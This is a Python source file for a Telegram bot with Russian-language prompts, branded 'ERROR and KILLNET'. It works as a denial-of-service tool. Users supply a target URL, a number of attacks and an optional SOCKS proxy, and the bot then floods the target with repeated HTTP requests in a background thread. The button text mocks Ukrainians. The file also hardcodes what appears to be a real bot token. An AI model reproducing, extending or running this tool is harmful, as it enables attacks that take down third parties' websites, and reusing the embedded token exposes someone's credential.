TOKEN = '5297733323:AAGgHEydOXaxINgTMIQ-8rswASxX6vl6cjk'
query = {}


def start(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id,
                             text='ERROR and KILLNET вас приветствует {}!\nВведите цель.'
                             .format(update.effective_user.username))


def link(update, context):
    if update.effective_chat.id in query:
        query[update.effective_chat.id]['url'] = update.message.text
    else:
        query[update.effective_chat.id] = {'url': update.message.text}
    context.bot.send_message(chat_id=update.effective_chat.id,
                             text='Цель {}'.format(update.message.text) +
                             '\nУкажите количество атак.',
                             disable_web_page_preview=True)


def proxy(update, context):
    if update.effective_chat.id in query:
        query[update.effective_chat.id]['proxy'] = update.message.text
    else:
        query[update.effective_chat.id] = {'proxy': update.message.text}
    context.bot.send_message(chat_id=update.effective_chat.id,
                             text='Прокси {}'.format(update.message.text),
                             disable_web_page_preview=True)


def dos(url, count, prxy):
    import requests as rq
    for _ in range(count):
        resp = rq.get(url, proxies={'http': prxy,
                                    'https': prxy})
        print(resp.url, resp.status_code)


def drop(update, context):
    from telegram.replykeyboardremove import ReplyKeyboardRemove
    if update.effective_chat.id in query and \
       'url' in query[update.effective_chat.id] and \
       'count' in query[update.effective_chat.id]:
        context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Роняем {}'.format(query[update.effective_chat.id]['url']),
                                 reply_markup=ReplyKeyboardRemove())
        import threading
        th = threading.Thread(target=dos, args=(query[update.effective_chat.id]['url'],
                                                query[update.effective_chat.id]['count'],
                                                query[update.effective_chat.id]['proxy']
                                                if 'proxy' in query[update.effective_chat.id] else None,))
        th.daemon = True
        th.start()
    else:
        context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Сначала нужно выбрать цель и количество атак.',
                                 reply_markup=ReplyKeyboardRemove())


def charge(update, context):
    if update.effective_chat.id in query and 'url' in query[update.effective_chat.id]:
        query[update.effective_chat.id]['count'] = int(update.message.text)
        from telegram.replykeyboardmarkup import ReplyKeyboardMarkup
        context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Уроним {} {} раз.'.format(query[update.effective_chat.id]['url'],
                                                                 query[update.effective_chat.id]['count']) +
                                 '\nЧерез прокси {}'.format(query[update.effective_chat.id]['proxy'])
                                 if 'proxy' in query[update.effective_chat.id]
                                 else '\nТакже возможно указать SOCKS4/5 прокси.' +
                                 '\nТеперь осталось только уронить!',
                                 reply_markup=ReplyKeyboardMarkup([['Уронить сало!']]))

    else:
        context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Сначала нужно выбрать цель.')


def unknown(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id,
                             text="Не требуйте от меня невозможного!")


if __name__ == '__main__':
    from telegram.ext import Updater
    from telegram.ext import CommandHandler, MessageHandler, Filters
    updater = Updater(token=TOKEN, use_context=True)
    updater.dispatcher.add_handler(CommandHandler('start', start))
    updater.dispatcher.add_handler(MessageHandler(Filters.regex(r'Уронить сало!'), drop))
    updater.dispatcher.add_handler(MessageHandler(Filters.regex(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+'), link))
    updater.dispatcher.add_handler(MessageHandler(Filters.regex(r'socks[4-5]://(?:[-\w.]|(?:%[\da-fA-F]{2}))+'), proxy))
    updater.dispatcher.add_handler(MessageHandler(Filters.regex(r'^([\s\d]+)$'), charge))
    updater.dispatcher.add_handler(MessageHandler(Filters.command, unknown))
    updater.start_polling()
